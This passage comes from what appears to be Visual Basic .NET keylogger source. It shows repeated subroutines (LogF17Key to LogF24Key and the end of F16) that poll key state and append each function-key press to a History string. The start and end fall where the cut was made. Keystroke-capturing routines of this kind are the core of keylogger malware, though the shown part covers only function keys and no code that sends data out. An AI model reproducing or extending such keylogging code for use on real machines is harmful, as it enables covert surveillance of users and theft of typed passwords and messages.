    Else
      FunctionCount16 = 0
    End If
  End Sub
  Public Sub LogF17Key()
    If KeyIsDown(Keys.F17) = True Then
      'MsgBox("d")
      If FunctionCount17 = 0 Then
        'Key Down Initialized
        FunctionCount17 = FunctionCount17 + 1
        History = History & "[F17]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount17 = 0
    End If
  End Sub
  Public Sub LogF18Key()
    If KeyIsDown(Keys.F18) = True Then
      'MsgBox("d")
      If FunctionCount18 = 0 Then
        'Key Down Initialized
        FunctionCount18 = FunctionCount18 + 1
        History = History & "[F18]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount18 = 0
    End If
  End Sub
  Public Sub LogF19Key()
    If KeyIsDown(Keys.F19) = True Then
      'MsgBox("d")
      If FunctionCount19 = 0 Then
        'Key Down Initialized
        FunctionCount19 = FunctionCount19 + 1
        History = History & "[F19]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount19 = 0
    End If
  End Sub
  Public Sub LogF20Key()
    If KeyIsDown(Keys.F20) = True Then
      'MsgBox("d")
      If FunctionCount20 = 0 Then
        'Key Down Initialized
        FunctionCount20 = FunctionCount20 + 1
        History = History & "[F20]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount20 = 0
    End If
  End Sub
  Public Sub LogF21Key()
    If KeyIsDown(Keys.F21) = True Then
      'MsgBox("d")
      If FunctionCount21 = 0 Then
        'Key Down Initialized
        FunctionCount21 = FunctionCount21 + 1
        History = History & "[F21]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount21 = 0
    End If
  End Sub
  Public Sub LogF22Key()
    If KeyIsDown(Keys.F22) = True Then
      'MsgBox("d")
      If FunctionCount22 = 0 Then
        'Key Down Initialized
        FunctionCount22 = FunctionCount22 + 1
        History = History & "[F22]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount22 = 0
    End If
  End Sub
  Public Sub LogF23Key()
    If KeyIsDown(Keys.F23) = True Then
      'MsgBox("d")
      If FunctionCount23 = 0 Then
        'Key Down Initialized
        FunctionCount23 = FunctionCount23 + 1
        History = History & "[F23]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount23 = 0
    End If
  End Sub
  Public Sub LogF24Key()
    If KeyIsDown(Keys.F24) = True Then
      'MsgBox("d")
      If FunctionCount24 = 0 Then
        'Key Down Initialized
        FunctionCount24 = FunctionCount24 + 1
        History = History & "[F24]"
      Else
        'While Key Is Downt
      End If
    Else
      FunctionCount24 = 0
    End If
  End Sub
End Module
```

